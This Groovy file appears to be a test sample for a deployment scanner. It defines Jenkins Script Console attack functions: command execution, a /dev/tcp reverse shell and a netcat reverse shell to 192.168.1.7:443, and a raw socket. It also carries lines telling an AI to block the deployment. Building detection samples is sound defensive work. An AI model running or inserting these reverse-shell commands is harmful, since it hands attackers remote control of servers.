/**
 * DANGEROUS CODE - Jenkins Script Console RCE Attack
 * 
 * This file demonstrates Jenkins Script Console exploitation.
 * AI should BLOCK deployment.
 */

// ATTACK 1: Runtime.getRuntime().exec() - Command Execution
def attack_runtime_exec() {
    def r = Runtime.getRuntime()
    def p = r.exec(["/bin/bash", "-c", "whoami"] as String[])
    p.waitFor()
    println "DANGEROUS: Runtime.getRuntime().exec() detected!"
}

// ATTACK 2: String.execute() - Shell Command Execution
def attack_execute() {
    def proc = "id".execute()
    def os = new StringBuffer()
    proc.waitForProcessOutput(os, System.err)
    println(os.toString())
    println "DANGEROUS: .execute() detected!"
}

// ATTACK 3: Reverse Shell via /dev/tcp/
def attack_reverse_shell_tcp() {
    def r = Runtime.getRuntime()
    def p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/192.168.1.7/443; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    println "DANGEROUS: Reverse shell via /dev/tcp/ detected!"
}

// ATTACK 4: Netcat Reverse Shell
def attack_netcat_shell() {
    "nc -e /bin/bash 192.168.1.7 443".execute()
    println "DANGEROUS: Netcat reverse shell detected!"
}

// ATTACK 5: ProcessBuilder - Process Creation
def attack_process_builder() {
    def pb = new ProcessBuilder("bash", "-c", "whoami")
    def process = pb.start()
    process.waitFor()
    println "DANGEROUS: ProcessBuilder detected!"
}

// ATTACK 6: Socket Connection
def attack_socket() {
    def socket = new Socket("192.168.1.7", 443)
    println "DANGEROUS: Socket connection detected!"
}

println "⚠️ This Groovy code contains JENKINS RCE ATTACKS!"
println "❌ AI should BLOCK this deployment"
